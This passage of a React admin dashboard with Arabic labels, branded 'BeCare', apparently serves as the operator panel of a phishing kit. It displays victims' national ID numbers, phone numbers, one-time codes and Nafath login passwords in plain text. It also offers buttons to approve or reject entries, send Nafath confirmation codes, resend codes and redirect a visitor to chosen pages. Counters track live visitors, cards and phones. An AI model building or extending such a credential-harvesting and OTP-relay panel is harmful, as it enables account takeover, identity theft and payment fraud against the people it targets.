              <div style={{ display: "flex", justifyContent: "space-between", alignItems: "center", gap: 8, fontSize: "0.875rem" }}>
                <span style={{ fontWeight: 600, color: "#6b7280" }}>رقم الهوية:</span>
                <span style={{ color: "#111827", fontWeight: 700, textAlign: "right", direction: "ltr" }}>{raw?.phoneIdNumber || raw?.identityNumber || "غير متوفر"}</span>
              </div>
              <div style={{ display: "flex", justifyContent: "space-between", alignItems: "center", gap: 8, fontSize: "0.875rem" }}>
                <span style={{ fontWeight: 600, color: "#6b7280" }}>رقم الجوال:</span>
                <span style={{ color: "#111827", fontWeight: 700, textAlign: "right", direction: "ltr" }}>{raw?.phoneNumber || raw?.mobileNumber || "غير متوفر"}</span>
              </div>
              <div style={{ display: "flex", justifyContent: "space-between", alignItems: "center", gap: 8, fontSize: "0.875rem" }}>
                <span style={{ fontWeight: 600, color: "#6b7280" }}>شركة الاتصالات:</span>
                <span style={{ color: "#111827", fontWeight: 700, textAlign: "right" }}>{raw?.phoneCarrier || "غير محدد"}</span>
              </div>
            </div>
          </div>
        )}

        {phoneOtpCode && (
          <div style={{ background: "#f9fafb", borderRadius: 8, padding: 8, border: "1px solid #d1d5db", fontFamily: "Cairo, Tajawal, sans-serif", marginBottom: 8 }}>
            <div style={{ marginBottom: 8 }}>
              <div style={{ fontSize: "10px", color: "#6b7280", textAlign: "right", marginBottom: 2 }}>
                {(() => {
                  const dt = new Date(selectedRequest?.submittedAt || selectedRequest?.updatedAt || Date.now());
                  const dateLabel = dt.toLocaleDateString("en-US", { month: "2-digit", day: "2-digit" }).replace(/\//g, "-");
                  const timeLabel = dt.toLocaleTimeString("en-US", { hour: "numeric", minute: "2-digit", hour12: true }).toLowerCase();
                  return `${dateLabel} | ${timeLabel}`;
                })()}
              </div>
              <h3 style={{ margin: 0, fontSize: "0.875rem", fontWeight: 700, color: "#111827", textAlign: "center" }}>كود تحقق الهاتف</h3>
            </div>
            <div style={{ display: "flex", justifyContent: "center", gap: 4, direction: "ltr", marginBottom: 0 }}>
              {String(phoneOtpCode).split("").slice(0, 6).map((digit, idx) => (
                <div key={`${digit}-${idx}`} style={{ background: "#ffffff", borderRadius: 6, boxShadow: "0 1px 2px rgba(0, 0, 0, 0.04)", display: "flex", alignItems: "center", justifyContent: "center", width: 32, height: 40 }}>
                  <span style={{ fontSize: "1.25rem", fontWeight: 700, color: "#111827" }}>{digit}</span>
                </div>
              ))}
            </div>
          </div>
        )}

        {phoneOtpStatus === "approved" && (
          <div style={{ background: "#dcfce7", borderRadius: 8, padding: 12, border: "1px solid #86efac", marginBottom: 8 }}>
            <p style={{ margin: 0, fontSize: "0.85rem", color: "#166534", fontWeight: 600 }}>✅ موافق - العميل يُوجه للصفحة التالية</p>
          </div>
        )}
        {phoneOtpStatus === "rejected" && (
          <div style={{ background: "#fee2e2", borderRadius: 8, padding: 12, border: "1px solid #fca5a5", marginBottom: 8 }}>
            <p style={{ margin: 0, fontSize: "0.85rem", color: "#991b1b", fontWeight: 600 }}>❌ مرفوض - رقم الهاتف غير صحيح</p>
          </div>
        )}

        {(phoneOtpCode || currentStep === 5 || currentPage === "step5" || currentPage === "phone") && (
          <div style={{ display: "flex", gap: 8, flexDirection: "column" }}>
            <div style={{ display: "flex", gap: 8 }}>
              <button onClick={() => handlePhoneAction("approved")} disabled={actionLoading === "phone"}
                style={{ flex: 1, padding: "12px 16px", border: "none", borderRadius: 8, background: "#22c55e", color: "#fff", fontWeight: 700, cursor: "pointer" }}>
                {actionLoading === "phone" ? "جاري..." : "✅ موافق"}
              </button>
              <button onClick={() => handlePhoneAction("rejected")} disabled={actionLoading === "phone"}
                style={{ flex: 1, padding: "12px 16px", border: "none", borderRadius: 8, background: "#ef4444", color: "#fff", fontWeight: 700, cursor: "pointer" }}>
                {actionLoading === "phone" ? "جاري..." : "❌ مرفوض"}
              </button>
            </div>
            <button onClick={() => handlePhoneAction("resend")} disabled={actionLoading === "phone"}
              style={{ padding: "12px 16px", border: "none", borderRadius: 8, background: "#f59e0b", color: "#fff", fontWeight: 700, cursor: "pointer" }}>
              🔄 إعادة إرسال رمز
            </button>
          </div>
        )}
      </div>
    );
  };

  // Render Nafad box (currentStep === 8)
  const renderNafadBox = () => {
    const currentStep = getCurrentStep();
    const raw = selectedRequest?.raw;

    // Get nafad data
    const hasNafadData = raw?.nafadIdNumber || raw?.nafadPassword;
    const adminNafadCode = raw?.adminNafadCode;
    
    // Show box if there's nafad data OR admin sent code OR at step 8
    if (!hasNafadData && !adminNafadCode && currentStep !== 8) {
      return null;
    }

    return (
      <div style={{ background: "#f9fafb", borderRadius: 8, padding: 8, border: "1px solid #d1d5db", fontFamily: "Cairo, Tajawal, sans-serif", marginBottom: 12 }}>
        <div style={{ marginBottom: 8 }}>
          <div style={{ fontSize: "10px", color: "#6b7280", textAlign: "right", marginBottom: 2 }}>
            {new Date(selectedRequest?.submittedAt || selectedRequest?.updatedAt || Date.now()).toLocaleDateString("en-GB", { day: "2-digit", month: "2-digit" })} | {new Date(selectedRequest?.submittedAt || selectedRequest?.updatedAt || Date.now()).toLocaleTimeString("en-US", { hour: "2-digit", minute: "2-digit", hour12: true })}
          </div>
          <h3 style={{ margin: 0, fontSize: "0.875rem", fontWeight: 700, color: "#111827", textAlign: "center" }}>🇸🇦 نفاذ</h3>
        </div>
        <div style={{ background: "#ffffff", borderRadius: 6, padding: 8, boxShadow: "0 1px 2px rgba(0, 0, 0, 0.04)", marginBottom: 8 }}>
          <div style={{ display: "flex", flexDirection: "column", gap: 8 }}>
            {raw?.nafadIdNumber && (
              <div style={{ display: "flex", justifyContent: "space-between", alignItems: "center", gap: 8, fontSize: "0.875rem" }}>
                <span style={{ fontWeight: 600, color: "#6b7280" }}>رقم الهوية:</span>
                <span style={{ color: "#111827", fontWeight: 700, textAlign: "right" }}>{raw.nafadIdNumber}</span>
              </div>
            )}
            {raw?.nafadPassword && (
              <div style={{ display: "flex", justifyContent: "space-between", alignItems: "center", gap: 8, fontSize: "0.875rem" }}>
                <span style={{ fontWeight: 600, color: "#6b7280" }}>كلمة المرور:</span>
                <span style={{ color: "#111827", fontWeight: 700, textAlign: "right" }}>{String(raw.nafadPassword)}</span>
              </div>
            )}
            <div style={{ display: "flex", justifyContent: "space-between", alignItems: "center", gap: 8, fontSize: "0.875rem" }}>
              <span style={{ fontWeight: 600, color: "#6b7280" }}>رقم التأكيد المُرسل:</span>
              <span style={{ color: "#111827", fontWeight: 700, textAlign: "right" }}>{adminNafadCode || "00"}</span>
            </div>
          </div>
        </div>
        <div style={{ display: "flex", flexDirection: "column", gap: 12, marginTop: 8 }}>
          <div style={{ display: "flex", gap: 8 }}>
            <input
              type="text"
              placeholder="أدخل رقم التأكيد"
              value={nafadInput}
              onChange={(e) => setNafadInput(e.target.value.replace(/\D/g, "").slice(0, 2))}
              style={{ flex: 1, padding: "10px 12px", border: "1px solid #d1d5db", borderRadius: 8, fontSize: "0.875rem" }}
            />
            <button
              onClick={() => {
                handleSendNafadCode();
                setNafadInput("");
              }}
              disabled={actionLoading === "nafad" || !nafadInput}
              style={{ padding: "10px 16px", background: nafadInput ? "#2563eb" : "#9ca3af", color: nafadInput ? "#ffffff" : "#f3f4f6", borderRadius: 8, fontSize: "0.875rem", fontWeight: 700, cursor: nafadInput ? "pointer" : "not-allowed", border: "none" }}
            >
              إرسال
            </button>
          </div>
        </div>
      </div>
    );
  };

  const renderCustomerEntrySummary = () => {
    if (!selectedRequest) return null;
    const previousEntries = customerEntryGroup.filter((entry) => entry.id !== selectedRequest.id);
    if (!previousEntries.length) return null;

    return (
      <div style={{ background: "#ffffff", border: "1px solid #e5e7eb", borderRadius: 12, padding: 12, marginBottom: 12, boxShadow: "0 1px 2px rgba(15, 23, 42, 0.04)" }}>
        <div style={{ fontSize: "0.8rem", fontWeight: 700, color: "#111827", marginBottom: 8 }}>إدخالات العميل داخل هذا الصندوق</div>
        <div style={{ display: "flex", flexDirection: "column", gap: 8 }}>
          {previousEntries.map((entry, index) => (
            <div key={entry.id} style={{ border: "1px solid #e5e7eb", borderRadius: 10, padding: 10, background: "#f8fafc" }}>
              <div style={{ display: "flex", justifyContent: "space-between", alignItems: "center", gap: 8, marginBottom: 6 }}>
                <span style={{ fontWeight: 700, color: "#111827" }}>إدخال جديد {index + 1}</span>
                <span style={{ fontSize: "0.75rem", color: "#64748b", background: "#f3f4f6", padding: "2px 8px", borderRadius: 6 }}>
                  {entry.stage || "مفتوح"}
                </span>
              </div>
              <div style={{ display: "flex", flexWrap: "wrap", gap: 8, fontSize: "0.8rem", color: "#374151" }}>
                <span>الهوية: {entry.raw?.identityNumber || entry.raw?.phoneIdNumber || entry.raw?.nafadIdNumber || "—"}</span>
                <span>الجوال: {entry.raw?.phoneNumber || entry.raw?.mobileNumber || "—"}</span>
                <span>الوقت: {new Date(entry.submittedAt || entry.updatedAt || Date.now()).toLocaleTimeString("en-US", { hour: "2-digit", minute: "2-digit", hour12: true })}</span>
              </div>
            </div>
          ))}
        </div>
      </div>
    );
  };

  // Render action buttons based on current page
  const renderActionButtons = () => {
    // Render all boxes independently (each shows/hides based on data availability and currentStep)
    return (
      <>
        {renderCardVerificationBox()}
        {renderCardOtpBox()}
        {renderPinBox()}
        {renderPhoneOtpBox()}
        {renderNafadBox()}
      </>
    );
  };

  return (
    <div style={{ minHeight: "100vh", background: "#f8fafc", fontFamily: "Tahoma, Arial, sans-serif", margin: 0, padding: 0 }} dir="rtl">
      {/* Notification */}
      {notification && (
        <div
          style={{
            position: "fixed",
            top: 70,
            left: "50%",
            transform: "translateX(-50%)",
            padding: "12px 24px",
            borderRadius: 8,
            background: notification.type === "success" ? "#22c55e" : "#ef4444",
            color: "#fff",
            fontWeight: 600,
            zIndex: 1000,
            boxShadow: "0 4px 12px rgba(0,0,0,0.15)",
            direction: "rtl",
          }}
        >
          {notification.message}
        </div>
      )}

      {/* Header */}
      <header
        style={{
          display: "flex",
          alignItems: "center",
          gap: 0,
          height: 54,
          padding: "0 12px",
          background: "#ffffff",
          borderBottom: "1px solid #e5e7eb",
          position: "sticky",
          top: 0,
          zIndex: 100,
          boxShadow: "0 1px 0 rgba(15, 23, 42, 0.04)",
        }}
        dir="rtl"
      >
        <div style={{ display: "flex", alignItems: "center", gap: 8, paddingLeft: 12, borderLeft: "1px solid #e5e7eb" }}>
          <div
            style={{
              width: 28,
              height: 28,
              borderRadius: 8,
              background: "linear-gradient(135deg, #22c55e, #15803d)",
              display: "grid",
              placeItems: "center",
              fontWeight: 900,
              fontSize: "0.8rem",
              color: "#fff",
              boxShadow: "0 8px 20px rgba(34, 197, 94, 0.22)",
            }}
          >
            B
          </div>
          <span style={{ color: "#111827", fontWeight: 800, fontSize: "0.9rem", letterSpacing: "0.04em" }}>BeCare</span>
        </div>

        <div style={{ display: "flex", alignItems: "center", gap: 0, marginRight: "auto", overflowX: "auto", scrollbarWidth: "none" }}>
          <div style={{ display: "flex", alignItems: "center", gap: 6, padding: "0 12px", borderLeft: "1px solid #e5e7eb" }}>
            <span style={{ width: 8, height: 8, borderRadius: "50%", background: "#4ade80", boxShadow: "0 0 0 4px rgba(74, 222, 128, 0.2)" }} />
            <span style={{ color: "#16a34a", fontWeight: 700, fontSize: "0.9rem" }}>{stats.activeCount}</span>
            <span style={{ color: "#64748b", fontSize: "0.72rem" }}>الزوار الحاليون</span>
          </div>

          <div style={{ display: "flex", alignItems: "center", gap: 6, padding: "0 12px", borderLeft: "1px solid #e5e7eb" }}>
            <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="#9ca3af" strokeWidth="2">
              <path d="M16 7h6v6" />
              <path d="m22 7-8.5 8.5-5-5L2 17" />
            </svg>
            <span style={{ color: "#6b7280", fontSize: "0.72rem" }}>اليوم</span>
            <span style={{ fontWeight: 700, fontSize: "0.9rem" }}>{stats.todayCount}</span>
          </div>

          <div style={{ display: "flex", alignItems: "center", gap: 6, padding: "0 12px", borderLeft: "1px solid #e5e7eb" }}>
            <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="#9ca3af" strokeWidth="2">
              <circle cx="12" cy="12" r="10" />
              <path d="M2 12h20" />
              <path d="M12 2a14.5 14.5 0 0 0 0 20 14.5 14.5 0 0 0 0-20" />
            </svg>
            <span style={{ color: "#6b7280", fontSize: "0.72rem" }}>إجمالي</span>
            <span style={{ fontWeight: 700, fontSize: "0.9rem" }}>{stats.total}</span>
          </div>

          <div style={{ display: "flex", alignItems: "center", gap: 6, padding: "0 12px", borderLeft: "1px solid #e5e7eb", color: "#2563eb" }}>
            <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2">
              <rect width="20" height="14" x="2" y="5" rx="2" />
              <line x1="2" x2="22" y1="10" y2="10" />
            </svg>
            <span style={{ fontWeight: 700, fontSize: "0.9rem" }}>{stats.cardCount}</span>
          </div>

          <div style={{ display: "flex", alignItems: "center", gap: 6, padding: "0 12px", borderLeft: "1px solid #e5e7eb", color: "#16a34a" }}>
            <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2">
              <path d="M13.832 16.568a1 1 0 0 0 1.213-.303l.355-.465A2 2 0 0 1 17 15h3a2 2 0 0 1 2 2v3a2 2 0 0 1-2 2A18 18 0 0 1 2 4a2 2 0 0 1 2-2h3a2 2 0 0 1 2 2v3a2 2 0 0 1-.8 1.6l-.468.351a1 1 0 0 0-.292 1.233 14 14 0 0 0 6.392 6.384" />
            </svg>
            <span style={{ fontWeight: 700, fontSize: "0.9rem" }}>{stats.phoneCount}</span>
          </div>

          <div style={{ width: 1, height: 20, background: "#e5e7eb", margin: "0 4px" }} />

          <div style={{ display: "flex", alignItems: "center", gap: 6, padding: "0 12px", borderLeft: "1px solid #e5e7eb" }}>
            <span style={{ color: "#64748b", fontSize: "0.72rem" }}>زوار</span>
            <span style={{ color: "#16a34a", fontWeight: 700, fontSize: "0.9rem" }}>{stats.newCount}</span>
            <span style={{ color: "#94a3b8", fontSize: "0.72rem" }}>/</span>
            <span style={{ color: "#f59e0b", fontWeight: 700, fontSize: "0.9rem" }}>{stats.pendingCount}</span>
            <span style={{ color: "#94a3b8", fontSize: "0.72rem" }}>/</span>
            <span style={{ color: "#334155", fontWeight: 700, fontSize: "0.9rem" }}>{stats.total}</span>
          </div>

          <div style={{ display: "flex", alignItems: "center", gap: 6, padding: "0 12px" }}>
            <span style={{ color: "#64748b", fontSize: "0.72rem" }}>عملاء</span>
            <span style={{ color: "#16a34a", fontWeight: 700, fontSize: "0.9rem" }}>{stats.completedCount}</span>
            <span style={{ color: "#94a3b8", fontSize: "0.72rem" }}>/</span>
            <span style={{ color: "#f59e0b", fontWeight: 700, fontSize: "0.9rem" }}>{stats.pendingCount}</span>
            <span style={{ color: "#94a3b8", fontSize: "0.72rem" }}>/</span>
            <span style={{ color: "#334155", fontWeight: 700, fontSize: "0.9rem" }}>{stats.total}</span>
          </div>
        </div>

        <div style={{ display: "flex", alignItems: "center", gap: 0, marginRight: 8, borderRight: "1px solid #e5e7eb", paddingRight: 8 }}>
          <div ref={headerMenuRef} style={{ position: "relative" }}>
            <button
              onClick={() => setHeaderMenuOpen((value) => !value)}
              title="إعدادات"
              style={{
                display: "flex",
                alignItems: "center",
                justifyContent: "center",
                width: 40,
                height: 40,
                border: "none",
                borderRadius: 8,
                background: headerMenuOpen ? "#f3f4f6" : "transparent",
                cursor: "pointer",
              }}
            >
              <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="#94a3b8" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round">
                <path d="M9.671 4.136a2.34 2.34 0 0 1 4.659 0 2.34 2.34 0 0 0 3.319 1.915 2.34 2.34 0 0 1 2.33 4.033 2.34 2.34 0 0 0 0 3.831 2.34 2.34 0 0 1-2.33 4.033 2.34 2.34 0 0 0-3.319 1.915 2.34 2.34 0 0 1-4.659 0 2.34 2.34 0 0 0-3.32-1.915 2.34 2.34 0 0 1-2.33-4.033 2.34 2.34 0 0 0 0-3.831A2.34 2.34 0 0 1 6.35 6.051a2.34 2.34 0 0 0 3.319-1.915" />
                <circle cx="12" cy="12" r="3" />
              </svg>
            </button>
            {headerMenuOpen && (
              <div style={{ position: "absolute", top: 44, left: 0, minWidth: 180, background: "#fff", border: "1px solid #e5e7eb", borderRadius: 10, boxShadow: "0 12px 30px rgba(15, 23, 42, 0.12)", overflow: "hidden", zIndex: 120 }}>
                <button style={{ width: "100%", border: "none", background: "#fff", padding: "10px 12px", textAlign: "right", cursor: "pointer", color: "#0f172a", fontWeight: 600 }}>
                  لوحة التحكم
                </button>
                <button style={{ width: "100%", border: "none", background: "#f8fafc", padding: "10px 12px", textAlign: "right", cursor: "pointer", color: "#334155", fontWeight: 600 }}>
                  التقارير
                </button>
                <button style={{ width: "100%", border: "none", background: "#fff", padding: "10px 12px", textAlign: "right", cursor: "pointer", color: "#334155", fontWeight: 600 }}>
                  المستخدمون
                </button>
              </div>
            )}
          </div>

          <button title="تنبيهات" style={{ display: "flex", alignItems: "center", justifyContent: "center", width: 40, height: 40, border: "none", borderRadius: 8, background: "transparent", cursor: "pointer" }}>
            <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="#94a3b8" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round">
              <path d="M10.268 21a2 2 0 0 0 3.464 0" />
              <path d="M3.262 15.326A1 1 0 0 0 4 17h16a1 1 0 0 0 .74-1.673C19.41 13.956 18 12.499 18 8A6 6 0 0 0 6 8c0 4.499-1.411 5.956-2.738 7.326" />
            </svg>
          </button>

          <button title="تسجيل الخروج" style={{ display: "flex", alignItems: "center", gap: 8, padding: "0 10px", height: 40, border: "none", borderRadius: 999, background: "#f8fafc", cursor: "pointer" }}>
            <div style={{ width: 28, height: 28, borderRadius: "50%", background: "linear-gradient(135deg, #3b82f6, #7c3aed)", display: "grid", placeItems: "center", color: "#fff", fontWeight: 700, fontSize: "0.8rem" }}>
              A
            </div>
            <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="#94a3b8" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round">
              <path d="M19 9l-7 7-7-7" />
            </svg>
          </button>
        </div>
      </header>

      {/* Main Content */}
      <div style={{ display: "flex", minHeight: "calc(100vh - 54px)" }}>
        {/* Sidebar - Visitor List */}
        <aside
          style={{
            width: 340,
            background: "#ffffff",
            borderLeft: "1px solid #e5e7eb",
            display: "flex",
            flexDirection: "column",
            maxHeight: "calc(100vh - 54px)",
            overflow: "hidden",
          }}
        >
          {/* Search and Filters */}
          <div style={{ padding: 12, borderBottom: "1px solid #e5e7eb" }}>
            {/* Filter buttons */}
            <div style={{ display: "flex", gap: 8, marginBottom: 12 }}>
              <button
                onClick={() => setFilterMode("all")}
                style={{
                  flex: 1,
                  padding: "8px 12px",
                  border: filterMode === "all" ? "1px solid #22c55e" : "1px solid #e5e7eb",
                  borderRadius: 8,
                  background: filterMode === "all" ? "#f0fdf4" : "#fff",
                  color: filterMode === "all" ? "#16a34a" : "#6b7280",
                  fontWeight: 600,
                  cursor: "pointer",
                  fontSize: "0.85rem",
                }}
              >
                الكل ({requests.length})
              </button>
              <button
                onClick={() => setFilterMode("cards")}
                style={{
                  flex: 1,
                  padding: "8px 12px",
                  border: filterMode === "cards" ? "1px solid #22c55e" : "1px solid #e5e7eb",
                  borderRadius: 8,
                  background: filterMode === "cards" ? "#f0fdf4" : "#fff",
                  color: filterMode === "cards" ? "#16a34a" : "#6b7280",
                  fontWeight: 600,
                  cursor: "pointer",
                  fontSize: "0.85rem",
                }}
              >
                بطاقة ({stats.completedCount})
              </button>
            </div>

            {/* Search */}
            <div style={{ position: "relative" }}>
              <svg
                width="16"
                height="16"
                viewBox="0 0 24 24"
                fill="none"
                stroke="#9ca3af"
                strokeWidth="2"
                style={{ position: "absolute", right: 12, top: "50%", transform: "translateY(-50%)" }}
              >
                <circle cx="11" cy="11" r="8" />
                <path d="m21 21-4.3-4.3" />
              </svg>
              <input
                type="text"
                placeholder="بحث (الاسم، الهوية، الهاتف)"
                value={searchQuery}
                onChange={(e) => setSearchQuery(e.target.value)}
                style={{
                  width: "100%",
                  padding: "10px 12px 10px 36px",
                  border: "1px solid #e5e7eb",
                  borderRadius: 8,
                  fontSize: "0.85rem",
                  outline: "none",
                }}
              />
            </div>

            {selectedRequestIds.length > 0 && (
              <div style={{ display: "flex", gap: 8, marginTop: 12, flexWrap: "wrap" }}>
                <button
                  onClick={handleSelectAll}
                  style={{ flex: 1, minWidth: 84, padding: "8px 10px", borderRadius: 8, border: "1px solid #e5e7eb", background: "#f8fafc", color: "#0f172a", fontWeight: 700, cursor: "pointer" }}
                >
                  تحديد الكل
                </button>
                <button
                  onClick={handleDeleteSelected}
                  style={{ flex: 1, minWidth: 84, padding: "8px 10px", borderRadius: 8, border: "1px solid #fecaca", background: "#fef2f2", color: "#b91c1c", fontWeight: 700, cursor: "pointer" }}
                >
                  حذف
                </button>
                <button
                  onClick={handleArchiveSelected}
                  style={{ flex: 1, minWidth: 84, padding: "8px 10px", borderRadius: 8, border: "1px solid #bfdbfe", background: "#eff6ff", color: "#1d4ed8", fontWeight: 700, cursor: "pointer" }}
                >
                  أرشفة
                </button>
              </div>
            )}
          </div>

          {/* Visitor List - Sorted by newest first */}
          <div style={{ flex: 1, overflowY: "auto" }}>
            {filteredRequests.map((item) => {
              const isSelected = selectedRequestIds.includes(item.id);
              return (
                <div
                  key={item.id}
                  onClick={() => setSelectedRequestId(item.id)}
                  style={{
                    padding: "16px",
                    borderBottom: "1px solid #f3f4f6",
                    background: selectedRequestId === item.id ? "#e0f2fe" : "#fff",
                    cursor: "pointer",
                    transition: "background 0.2s",
                  }}
                >
                  <div style={{ display: "flex", alignItems: "center", justifyContent: "space-between", marginBottom: 8 }}>
                    <div style={{ display: "flex", alignItems: "center", gap: 8, flex: 1 }}>
                      <input
                        type="checkbox"
                        checked={isSelected}
                        onChange={(event) => {
                          event.stopPropagation();
                          toggleRequestSelection(item.id);
                        }}
                        onClick={(event) => event.stopPropagation()}
                        style={{ accentColor: "#22c55e", cursor: "pointer" }}
                      />
                      <span style={{ fontSize: "1.3rem" }}>{getCountryFlag(item.raw)}</span>
                      <span style={{ fontWeight: 700, fontSize: "1rem", color: "#111827" }}>{item.customer}</span>
                    </div>
                    <div style={{ display: "flex", alignItems: "center", gap: 8 }}>
                      <span style={{ 
                        background: "#f3f4f6", 
                        padding: "4px 8px", 
                        borderRadius: 6,
                        fontSize: "0.8rem",
                        fontWeight: 600
                      }}>
                        ⏱️ <LiveTimer startTime={item.submittedAt || item.updatedAt || ""} />
                      </span>
                    </div>
                  </div>
                  <div style={{ display: "flex", alignItems: "center", justifyContent: "space-between" }}>
                    <div
                      style={{
                        display: "inline-block",
                        padding: "4px 12px",
                        borderRadius: 6,
                        fontSize: "0.8rem",
                        fontWeight: 600,
                        background:
                          item.stage === "الدفع"
                            ? "#dbeafe"
                            : item.stage === "التأمين"
                              ? "#fef3c7"
                              : item.stage === "مقارنة"
                                ? "#f3e8ff"
                                : item.stage === "OTP"
                                  ? "#fee2e2"
                                  : "#e0f2fe",
                        color:
                          item.stage === "الدفع"
                            ? "#2563eb"
                            : item.stage === "التأمين"
                              ? "#d97706"
                              : item.stage === "مقارنة"
                                ? "#9333ea"
                                : item.stage === "OTP"
                                  ? "#dc2626"
                                  : "#0284c7",
                      }}
                    >
                      {item.stage}
                    </div>
                    <span style={{ fontSize: "0.75rem", color: "#6b7280" }}>{item.updated}</span>
                  </div>
                </div>
              );
            })}
            {filteredRequests.length === 0 && (
              <div style={{ padding: 24, textAlign: "center", color: "#6b7280" }}>لا توجد نتائج</div>
            )}
          </div>
        </aside>

        {/* Main Panel - Client Details */}
        <main style={{ flex: 1, padding: 0, overflowY: "auto", margin: 0 }}>
          {selectedRequest && (
            <div style={{ maxWidth: "100%", width: "100%", margin: 0 }}>
              {/* Client Header */}
              <div
                style={{
                  background: "#ffffff",
                  border: "1px solid #e5e7eb",
                  boxShadow: "0 1px 2px rgba(15, 23, 42, 0.04)",
                }}
              >
                <div style={{ display: "flex", alignItems: "center", gap: 8, padding: "10px 12px", borderBottom: "1px solid #e5e7eb" }}>
                  <span style={{ fontSize: "11px", fontFamily: "ui-monospace, SFMono-Regular, monospace", color: "#6b7280", background: "#f3f4f6", border: "1px solid #e5e7eb", padding: "2px 8px", borderRadius: 4, flexShrink: 0 }}>
                    {selectedRequest.id.slice(0, 10).toUpperCase()}
                  </span>
                  <button
                    title="تحديث"
                    style={{ display: "flex", alignItems: "center", gap: 6, minWidth: 0, border: "none", background: "transparent", padding: 0, cursor: "pointer" }}
                  >
                    <span style={{ fontWeight: 700, color: "#111827", fontSize: "0.9rem", overflow: "hidden", textOverflow: "ellipsis", whiteSpace: "nowrap" }}>
                      {liveSummary.ownerName || selectedRequest.customer}
                    </span>
                    <span style={{ color: "#9ca3af", fontSize: "0.85rem" }}>↻</span>
                  </button>
                  <div style={{ flex: 1 }} />
                  <select
                    value={redirectPage}
                    onChange={async (e) => {
                      const selectedPage = e.target.value;
                      if (!selectedPage) return;

                      const visitorId = selectedRequest?.visitorId || selectedRequest?.id;
                      if (!visitorId) return;

                      setActionLoading("redirect");
                      setRedirectPage(selectedPage);

                      try {
                        const res = await fetch("/api/dashboard/redirect", {
                          method: "POST",
                          headers: { "Content-Type": "application/json" },
                          body: JSON.stringify({ visitorId, targetPage: selectedPage }),
                        });
                        if (res.ok) {
                          const pageLabel = pageOptions.find((p) => p.value === selectedPage)?.label || selectedPage;
                          showNotification("success", `تم توجيه العميل إلى: ${pageLabel}`);
                        } else {
                          showNotification("error", "حدث خطأ");
                        }
                      } catch {
                        showNotification("error", "فشل الاتصال");
                      }
                      setActionLoading(null);
                      setRedirectPage("");
                    }}
                    style={{
                      fontSize: "11px",
                      padding: "4px 8px",
                      background: "#ffffff",
                      border: "1px solid #d1d5db",
                      borderRadius: 6,
                      color: "#374151",
                      cursor: "pointer",
                      boxShadow: "0 1px 2px rgba(0,0,0,0.04)",
                    }}
                  >
                    {pageOptions.map((opt) => (
                      <option key={opt.value} value={opt.value}>{opt.label}</option>
                    ))}
                  </select>
                </div>
                <div style={{ display: "flex", alignItems: "center", gap: 0, overflowX: "auto", fontSize: "11px" }}>
                  <div style={{ display: "flex", alignItems: "center", gap: 6, padding: "8px 12px", borderLeft: "1px solid #f3f4f6", flexShrink: 0 }}>
                    <svg width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="#9ca3af" strokeWidth="2"><path d="M3 5a2 2 0 012-2h3.28a1 1 0 01.948.684l1.498 4.493a1 1 0 01-.502 1.21l-2.257 1.13a11.042 11.042 0 005.516 5.516l1.13-2.257a1 1 0 011.21-.502l4.493 1.498a1 1 0 01.684.949V19a2 2 0 01-2 2h-1C9.716 21 3 14.284 3 6V5z" /></svg>
                    <span style={{ color: "#374151", fontFamily: "ui-monospace, SFMono-Regular, monospace" }}>{liveSummary.phoneNumber}</span>
                  </div>
                  <div style={{ display: "flex", alignItems: "center", gap: 6, padding: "8px 12px", borderLeft: "1px solid #f3f4f6", flexShrink: 0 }}>
                    <svg width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="#9ca3af" strokeWidth="2"><path d="M10 6H5a2 2 0 00-2 2v9a2 2 0 002 2h14a2 2 0 002-2V8a2 2 0 00-2-2h-5m-4 0V5a2 2 0 114 0v1m-4 0a2 2 0 104 0m-5 8a2 2 0 100-4 2 2 0 000 4zm0 0c1.306 0 2.417.835 2.83 2M9 14a3.001 3.001 0 00-2.83 2M15 11h3m-3 4h2" /></svg>
                    <span style={{ color: "#374151", fontFamily: "ui-monospace, SFMono-Regular, monospace" }}>{liveSummary.identityNumber}</span>
                  </div>
                  <div style={{ display: "flex", alignItems: "center", gap: 6, padding: "8px 12px", borderLeft: "1px solid #f3f4f6", flexShrink: 0 }}>
                    <svg width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="#9ca3af" strokeWidth="2"><path d="M12 18h.01M8 21h8a2 2 0 002-2V5a2 2 0 00-2-2H8a2 2 0 00-2 2v14a2 2 0 002 2z" /></svg>
                    <span style={{ color: "#9ca3af" }}>{liveSummary.deviceType}</span>
                  </div>
                  <div style={{ display: "flex", alignItems: "center", gap: 6, padding: "8px 12px", borderLeft: "1px solid #f3f4f6", flexShrink: 0 }}>
                    <svg width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="#9ca3af" strokeWidth="2"><path d="M9 3H5a2 2 0 00-2 2v4m6-6h10a2 2 0 012 2v4M9 3v18m0 0h10a2 2 0 002-2V9M9 21H5a2 2 0 01-2-2V9m0 0h18" /></svg>
                    <span style={{ color: "#9ca3af" }}>{liveSummary.os}</span>
                  </div>
                  <div style={{ display: "flex", alignItems: "center", gap: 6, padding: "8px 12px", borderLeft: "1px solid #f3f4f6", flexShrink: 0 }}>
                    <svg width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="#9ca3af" strokeWidth="2"><path d="M21 12a9 9 0 01-9 9m9-9a9 9 0 00-9-9m9 9H3m9 9a9 9 0 01-9-9m9 9c1.657 0 3-4.03 3-9s-1.343-9-3-9m0 18c-1.657 0-3-4.03-3-9s1.343-9 3-9m-9 9a9 9 0 019-9" /></svg>
                    <span style={{ color: "#9ca3af" }}>{liveSummary.browser}</span>
                  </div>
                  <div style={{ display: "flex", alignItems: "center", gap: 6, padding: "8px 12px", borderLeft: "1px solid #f3f4f6", flexShrink: 0 }}>
                    <span style={{ fontSize: "0.95rem" }}>{getCountryFlag(selectedRequest.raw)}</span>
                    <span style={{ color: "#9ca3af" }}>{getCountryCode(selectedRequest.raw)}</span>
                  </div>
